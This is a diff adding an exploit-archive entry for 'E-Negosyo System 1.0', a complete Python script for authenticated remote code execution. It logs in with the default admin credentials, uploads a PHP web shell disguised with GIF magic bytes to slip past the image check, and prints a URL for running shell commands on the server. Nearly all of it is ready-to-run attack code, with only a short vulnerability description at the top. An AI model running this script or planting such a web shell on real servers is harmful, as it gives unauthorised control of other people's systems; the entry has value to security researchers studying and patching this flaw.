@@ -1,0 +1,110 @@
+id: 36789
+date: 09/22/2021
+title: E-Negosyo System 1.0 Shell Upload Vulnerability
+author: Janik Wehrli
+cves: 
+
+# Exploit Title: E-Negosyo System 1.0 - Authenticated RCE
+# Exploit Author: Janik Wehrli
+# Vendor Homepage: https://www.sourcecodester.com/users/janobe
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/bsenordering_0.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: Ubuntu 18.04, Windows 10 Home
+
+
+# Description:
+# The E-Negosyo System 1.0 suffers from an Authenticated RCE vulnerability.
+# An Administrator can upload a PHP file as new product image, because image uploads are not properly handled by the Webapp
+# The Error resides in the file /admin/products/controller.php - function doInsert() which validates images with getImageSize
+# This can be bypassed by inserting some magic bytes at the top of the PHP file.
+
+import requests, sys
+from colorama import Fore, Back, Style
+
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+F = [Fore.RESET, Fore.BLACK, Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
+B = [Back.RESET, Back.BLACK, Back.RED, Back.GREEN, Back.YELLOW, Back.BLUE, Back.MAGENTA, Back.CYAN, Back.WHITE]
+S = [Style.RESET_ALL, Style.DIM, Style.NORMAL, Style.BRIGHT]
+info = S[3] + F[5] + '[' + S[0] + S[3] + '-' + S[3] + F[5] + ']' + S[0] + ' '
+err = S[3] + F[2] + '[' + S[0] + S[3] + '!' + S[3] + F[2] + ']' + S[0] + ' '
+ok = S[3] + F[3] + '[' + S[0] + S[3] + '+' + S[3] + F[3] + ']' + S[0] + ' '
+
+ASCII_ART = """
+
+       _.---._    /\\
+    ./'       "--`\//
+  ./              o \
+ /./\  )______   \__ \
+./  / /\ \   | \ \  \ \
+   / /  \ \  | |\ \  \7
+    "     "    "  "       
+
+
+E-Negosyo System Authenticated RCE v1.0 Janik Wehrli
+"""
+
+# Set variables
+print(ASCII_ART)
+SERVER_URL = str(
+    input("Type in your E-Negosyo System Location e.g http://192.168.20.20/bsenordering: \n"))
+LOGIN_URL = SERVER_URL + '/admin/login.php'
+# You may have to adjust the id of the picture
+UPLOAD_URL = SERVER_URL + "/admin/products/controller.php?action=photos&id=201735"
+PWN_URL = SERVER_URL + "/admin/products/uploaded_photos/"
+# Set your own credentials (janobe:admin by default on v1.0)
+USERNAME = "janobe"
+PASSWORD = "admin"
+WEBSHELL_NAME = "pwn.php"
+
+# Uncomment the bottom line to run the exploit through a proxy such as burp
+# proxies         = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+
+# Create a simple web session with python
+s = requests.Session()
+# GET request to webserver - Start a session & retrieve a session cookie
+get_session = s.get(LOGIN_URL, verify=False)
+# Check connection to website & print session cookie to terminal OR die
+if get_session.status_code == 200:
+    print(ok + 'Successfully connected to E-Negosyo System server & created session.')
+    print(info + "Session Cookie: " + get_session.headers['Set-Cookie'])
+else:
+    print(err + 'Cannot connect to the server and create a web session.')
+    sys.exit(-1)
+
+# 1. Login to get Admin access
+login_data = {'username': USERNAME, 'password': PASSWORD, 'login': ''}
+print(
+    info + "Attempting to Login to E-Negosyo System v1.0 with the following credentials: " + "username:" + USERNAME + ":" + "password:" + PASSWORD)
+# auth        = s.post(url=LOGIN_URL, data=login_data, verify=False, proxies=proxies)
+auth = s.post(url=LOGIN_URL, data=login_data, verify=False, allow_redirects=True)
+if auth.status_code == 200:
+    print(ok, "Login Success")
+else:
+    print(err, "Something Went Wrong")
+
+# 2. Upload simple PHP Webshell to get command execution
+# Content-Disposition: form-data; name="image"; filename="pwn.php"
+# Content-Type: application/octet-stream
+webshell = {
+    'photo':
+        (
+            WEBSHELL_NAME,
+            'GIF89a <?php echo shell_exec($_GET["cmd"]);?>',
+            'application/octet-stream',
+            {'Content-Disposition': 'form-data'}
+        )
+}
+print(info + "Upload Webshell via insecure verification of images (getimagesize()) add GIF Magic Bytes")
+print(info + "Send Post malicious POST Request to the Server")
+
+upload_webshell = s.post(url=UPLOAD_URL, files=webshell, verify=False)
+
+if "window.location='index.php'" in upload_webshell.text:
+    print(ok, "Success")
+    print(ok, "Your Webshell is located under: " + PWN_URL + WEBSHELL_NAME)
+    print(ok, "Execute Commands via the GET Parameter 'cmd' for e.g " + PWN_URL + WEBSHELL_NAME + "?cmd=whoami")
+else:
+    print(err, "Something Went Wrong")
+
+#  0day.today [2023-03-25]  #
